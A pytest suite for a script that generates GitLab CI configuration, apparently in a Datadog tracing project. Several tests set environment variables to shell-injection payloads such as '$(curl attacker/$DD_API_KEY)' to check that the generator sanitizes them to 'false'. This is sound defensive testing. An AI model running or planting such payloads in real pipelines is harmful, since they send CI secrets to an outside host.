"""Tests for scripts/gen_gitlab_config.py."""

import importlib.util
import io
import pathlib
import sys
import types
from unittest import mock

import pytest


_SCRIPT_PATH = pathlib.Path(__file__).resolve().parents[2] / "scripts" / "gen_gitlab_config.py"


@pytest.fixture(scope="module")
def gen_gitlab_config_mod():
    # The script is not importable as-is: it runs under uv with its own dependencies, parses argv at
    # import time, and appends to sys.path. Stub ruamel.yaml, give it an empty argv, and restore
    # sys.path afterwards so the rest of the suite is unaffected.
    ruamel = types.ModuleType("ruamel")
    yaml = types.ModuleType("ruamel.yaml")

    class YAML:
        def load(self, content):
            return {"variables": {"TESTRUNNER_IMAGE": "testrunner:fake"}}

    yaml.YAML = YAML
    ruamel.yaml = yaml

    spec = importlib.util.spec_from_file_location("gen_gitlab_config", _SCRIPT_PATH)
    assert spec is not None and spec.loader is not None
    module = importlib.util.module_from_spec(spec)
    original_path = list(sys.path)
    with mock.patch.dict(sys.modules, {"ruamel": ruamel, "ruamel.yaml": yaml, spec.name: module}):
        with mock.patch.object(sys, "argv", [str(_SCRIPT_PATH)]):
            spec.loader.exec_module(module)
        try:
            yield module
        finally:
            sys.path[:] = original_path


@pytest.mark.parametrize(
    "value, expected",
    [
        (None, "false"),
        ("", "false"),
        ("false", "false"),
        ("true", "true"),
        ("TRUE", "true"),
        (" true", "false"),
        ("$(curl attacker/$DD_API_KEY)", "false"),
        ('true" && curl attacker/$DD_API_KEY #', "false"),
    ],
)
def test_get_bool_env_only_allows_literal_true(gen_gitlab_config_mod, monkeypatch, value, expected):
    monkeypatch.delenv("NIGHTLY_BUILD", raising=False)
    if value is not None:
        monkeypatch.setenv("NIGHTLY_BUILD", value)

    assert gen_gitlab_config_mod._get_bool_env("NIGHTLY_BUILD") == expected


def test_jobspec_sanitizes_nightly_build_before_script(gen_gitlab_config_mod, monkeypatch):
    monkeypatch.setenv("NIGHTLY_BUILD", "$(curl attacker/$DD_API_KEY)")

    with mock.patch.object(gen_gitlab_config_mod.subprocess, "check_output", return_value=b"pip-key\n"):
        config = str(gen_gitlab_config_mod.JobSpec(name="suite", stage="core"))

    assert '    - export NIGHTLY_BUILD="false"' in config
    assert "$(curl" not in config
    assert "$DD_API_KEY" not in config


def test_ddtest_requires_a_test_path_for_every_venv(gen_gitlab_config_mod):
    info = gen_gitlab_config_mod.SuiteVenvInfo(
        venv_count=2,
        python_versions={"3.12"},
        riot_venvs=(("hash-with-path", "3.12"), ("hash-without-path", "3.12")),
        venv_test_locations={"hash-with-path": "tests/internal", "hash-without-path": ""},
    )

    with pytest.raises(ValueError, match="hash-without-path"):
        gen_gitlab_config_mod._ddtest_module().validate_ddtest_venv_test_locations(
            "internal", info.riot_venvs, info.venv_test_locations
        )


def test_ddtest_jobs_emit_suite_environment(gen_gitlab_config_mod):
    output = io.StringIO()
    ddtest_jobs = gen_gitlab_config_mod._ddtest_module()

    with mock.patch.object(ddtest_jobs.subprocess, "check_output", return_value=b"pip-key\n"):
        ddtest_jobs.emit_ddtest_jobs(
            output,
            suite="internal",
            stage="core",
            clean_name="internal",
            config={"env": {"_DD_PYTEST_XDIST_INFERRED_SERVICE": "tests.internal"}},
            environments=[("abc1234", "3.13"), ("def5678", "3.14")],
            k=1,
            testrunner_image_hash="image-hash",
            runner="riot",
        )

    content = output.getvalue()
    assert "_DD_PYTEST_XDIST_INFERRED_SERVICE: tests.internal" in content
    assert "PIP_CACHE_DIR: ${CI_PROJECT_DIR}/.cache/pip" in content
    assert "PIP_CACHE_KEY: pip-key" in content
    assert "key: v1-pip-${PIP_CACHE_KEY}-image-hash-cache" in content
    assert "TEST_ENVIRONMENT_HASH_PYTHON: abc1234:3.13 def5678:3.14" in content
    run_313_needs = content.split("core/internal::ddtest-run-3.13:", 1)[1].split("\n  parallel:\n", 1)[0]
    run_314_needs = content.split("core/internal::ddtest-run-3.14:", 1)[1].split("\n  parallel:\n", 1)[0]
    assert 'PYTHON_VERSION: "3.13"' in run_313_needs
    assert 'PYTHON_VERSION: "3.14"' in run_314_needs
    assert 'PYTHON_VERSION: "3.14"' not in run_313_needs
    assert 'PYTHON_VERSION: "3.13"' not in run_314_needs


def test_ddtest_uv_jobs_preserve_the_suite_command(gen_gitlab_config_mod):
    output = io.StringIO()
    ddtest_jobs = gen_gitlab_config_mod._ddtest_module()
    metadata = {
        "uv123": (
            ".riot/requirements/uv123.txt",
            "tests/tracer/**/test*.py",
            "pytest -v --ignore=tests/tracer/test_uwsgi_shutdown.py tests/tracer/",
            "PYTHONOPTIMIZE=1",
        )
    }

    with mock.patch.object(ddtest_jobs.subprocess, "check_output", return_value=b"pip-key\n"):
        ddtest_jobs.emit_ddtest_jobs(
            output,
            suite="tracer",
            stage="core",
            clean_name="tracer",
            config={"env": {}},
            environments=[("uv123", "3.12")],
            k=1,
            testrunner_image_hash="image-hash",
            runner="uv",
            uv_metadata=metadata,
        )

    content = output.getvalue()
    assert "extends: .ddtest_plan_uv" in content
    assert "extends: .ddtest_run_uv" in content
    assert "DDTEST_UV_COMMAND_uv123: pytest -v --ignore=tests/tracer/test_uwsgi_shutdown.py tests/tracer/" in content
    assert "DDTEST_UV_ENV_uv123: PYTHONOPTIMIZE=1" in content


def test_build_base_venvs_template_gets_sanitized_bool_values(gen_gitlab_config_mod, monkeypatch, tmp_path):
    monkeypatch.setenv("NIGHTLY_BUILD", "$(curl attacker/$DD_API_KEY)")
    monkeypatch.setenv("UNPIN_DEPENDENCIES", "$(curl attacker/$DD_API_KEY)")
    monkeypatch.setattr(gen_gitlab_config_mod, "TESTS_GEN", tmp_path / "tests-gen.yml")
    monkeypatch.setattr(gen_gitlab_config_mod, "_global_python_versions", {"3.11"})

    gen_gitlab_config_mod.gen_build_base_venvs()

    config = (tmp_path / "tests-gen.yml").read_text()
    assert 'echo "NIGHTLY_BUILD: false"' in config
    assert 'echo "UNPIN_DEPENDENCIES: false"' in config
    assert 'if [[ "false" == "true" ]]' in config
    assert "$(curl" not in config
    assert "$DD_API_KEY" not in config


def test_migrated_jobs_use_uv_environments(gen_gitlab_config_mod):
    environment_hashes = ("first", "second", "third")
    config = str(
        gen_gitlab_config_mod.JobSpec(
            name="tracer",
            stage="core",
            suite="tracer",
            uses_uv=True,
            parallelism=2,
            python_versions={"3.10", "3.11"},
            environment_hashes=environment_hashes,
        )
    )

    assert "  extends: .test_base_uv" in config
    assert "    TEST_SUITE: tracer" in config
    configured_hashes = {
        environment_hash
        for line in config.splitlines()
        if line.strip().startswith("TEST_ENVIRONMENTS_")
        for environment_hash in line.rsplit('"', 2)[1].split()
    }
    assert configured_hashes == set(environment_hashes)


def test_migrated_jobs_allow_prerelease_dependencies_when_unpinned(gen_gitlab_config_mod, monkeypatch):
    monkeypatch.setenv("UNPIN_DEPENDENCIES", "true")

    config = str(gen_gitlab_config_mod.JobSpec(name="tracer", stage="core", suite="tracer", uses_uv=True))

    assert "    UV_PRERELEASE: allow" in config


def test_unmigrated_jobs_keep_using_riot(gen_gitlab_config_mod):
    with mock.patch.object(gen_gitlab_config_mod.subprocess, "check_output", return_value=b"pip-key\n"):
        config = str(gen_gitlab_config_mod.JobSpec(name="requests", stage="contrib", suite="requests"))

    assert "  extends: .test_base_riot" in config
    assert "    PIP_CACHE_KEY: pip-key" in config
    assert "TEST_ENVIRONMENTS_" not in config


def test_jobspec_default_pip_cache_is_pull_push(gen_gitlab_config_mod) -> None:
    with mock.patch.object(gen_gitlab_config_mod.subprocess, "check_output", return_value=b"pip-key\n"):
        config: str = str(gen_gitlab_config_mod.JobSpec(name="suite", stage="core"))

    assert "  cache:" in config
    assert "      - .cache" in config
    assert "    policy: pull" not in config


def test_jobspec_skip_pip_cache_is_pull_only(gen_gitlab_config_mod) -> None:
    with mock.patch.object(gen_gitlab_config_mod.subprocess, "check_output", return_value=b"pip-key\n"):
        config: str = str(gen_gitlab_config_mod.JobSpec(name="pytorch", stage="contrib", skip_pip_cache=True))

    assert "  cache:" in config
    assert "      - .cache" in config
    assert "    policy: pull" in config


def test_jobspec_uv_jobs_omit_pip_cache(gen_gitlab_config_mod) -> None:
    config: str = str(gen_gitlab_config_mod.JobSpec(name="tracer", stage="core", suite="tracer", uses_uv=True))

    assert "  cache:" not in config
    assert "PIP_CACHE_KEY" not in config
